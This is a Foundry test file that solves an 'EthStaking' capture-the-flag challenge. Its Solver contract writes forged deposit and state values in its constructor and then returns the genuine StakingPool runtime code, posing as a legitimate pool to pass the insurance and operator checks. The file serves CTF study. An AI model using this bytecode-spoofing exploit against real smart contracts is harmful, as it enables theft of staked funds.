// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Challenge, StakingPool} from "../lib/ctf/EthStaking/contracts/Challenge.sol";

contract ETHSkatingTest is Test {
    Challenge private challenge;
    Solver private solver;

    function setUp() external {
        skip(11451419);

        challenge = new Challenge{value: 10 ether}();
        solver = new Solver(address(challenge) , address(challenge.insurance()));
    }

    function test_hack() public {
        solver.registerInsurance();
        solver.endOperatorService();
        assertTrue(challenge.isSolved());

    }
}

    contract Solver is StakingPool {
        constructor(address _operator, address _insurance) StakingPool(_operator, _insurance) {
            deposits[msg.sender] =1;
            state = State.Validating;

            bytes memory code = type(StakingPool).runtimeCode;
            assembly {
                return (add(code,0x20),mload(code))
            }
        }
    }
